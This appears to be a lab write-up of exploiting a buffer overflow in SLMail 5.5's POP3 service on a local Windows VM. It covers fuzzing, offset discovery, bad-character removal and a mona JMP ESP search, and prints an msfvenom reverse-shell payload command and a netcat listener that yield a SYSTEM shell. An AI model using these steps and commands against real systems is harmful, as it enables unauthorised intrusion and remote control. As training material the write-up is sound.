# Windows Buffer Overflow

## Objective:
This project is centered on understanding and executing a Windows buffer overflow. By targeting a specific Windows virtual machine, the project aimed to shed light on the intricacies of buffer overflow vulnerabilities in a Windows environment, emphasizing the steps and tools necessary to exploit such flaws. The key objectives of the project are detailed below:
- **Manual Buffer Overflow:** Engaging in a step-by-step process to perform a buffer overflow against a Windows target, understanding the specific conditions and elements that lead to successful exploitation.
- **Immunity Debugger Integration:** Leveraging the Immunity Debugger to trace and understand the buffer overflow process in real time. This involved attaching specific processes to the debugger and observing program behavior during exploitation attempts.
- **Character Testing and EIP Control:** Using a fuzzer script to determine the exact point of EIP overwrite, followed by a systematic approach to identifying and removing bad characters to ensure the crafted payload's effectiveness.
- **Payload Crafting and Exploitation:** Utilizing MSFvenom to generate a specific payload, followed by setting breakpoints and adjusting scripts to gain control over the program's execution. Successfully exploiting the vulnerability led to obtaining a reverse shell on the target machine.

## Walkthrough:
- Initialized the BOF machine, accessed the command prompt as an administrator, and ran “slmgr /rearm” and “ipconfig” to determine the machine's IP address as “10.0.2.10”.


- Installed “12f1ab027e5374587e7e998c00682c5d-SLMail55_4433.exe” on the Windows VM, rebooted it, and created a desktop shortcut for “SLmail.cpl”.


- Opened both “SLmail.cpl” & “Immunity debugger” with administrative rights.


- In “Immunity debugger”, attached the “SLmail.exe” file and ensured it's actively running.


- On my Kali machine, downloaded the fuzzer script labeled “fuzzerScript.py” and stored it in a “BOF” folder on my desktop.


- In the same folder, created and edited a file named “fuzzy.py”. Line 13 requires the target IP address and port number.


- Conducted an nmap scan on the target VM to confirm open ports and noted the active “pop3” protocol.


- Updated “fuzzy.py” with the target IP address and port, then saved changes.


- Navigated to the BOF directory and executed the “fuzzy.py” script using the “python2 fuzzy.py” command.


- Observed the EIP update to “41414141” in Immunity debugger.


- Generated an MSF pattern of 3000 bytes using the “msf-pattern_create -l 3000” command to pinpoint control flow locations.


- Updated the “fuzzy.py” script's buffer with the generated MSF pattern and removed unnecessary loops.


- Reset SLmail.cpl and the Immunity debugger, re-executed the “fuzzy.py” script, and noted the updated EIP value in Immunity debugger.


- Determined the exact memory offset using the “msf-pattern_offset -l 3000 -q 39694438” command.


- Validated the offset by adjusting the buffer in “fuzzy.py” and observing the Immunity debugger's EIP value.


- Incorporated a list of potential bad characters into the “fuzzy.py” buffer to refine the exploit.


- Re-executed the adjusted “fuzzy.py” script and followed the ESP in dump within Immunity debugger to identify and remove any bad characters.


- Identified certain characters as "bad" and removed them from the "fuzzy.py" buffer.


- Re-executed the "fuzzy.py" script with the refined buffer and monitored the outcome in Immunity debugger.


- Searched for mona modules using the “!mona modules” command and identified a suitable dll with “!mona find -s "\xff\xe4" -m SLMFC.DLL”.


- Crafted a shell code using the “msfvenom -p windows/shell_reverse_tcp LPORT=4444 LHOST=10.0.2.6 -f c -b "\x00\x0a\x0d"” command.


- Integrated the shell code into “fuzzy.py” and adjusted the buffer accordingly.


- Established a netcat listener on the Kali machine using “nc -lvp 4444”.


- Restarted SLmail, ran the “fuzzy.py” script, and achieved system access with highest-level permissions as confirmed by the “whoami” command.
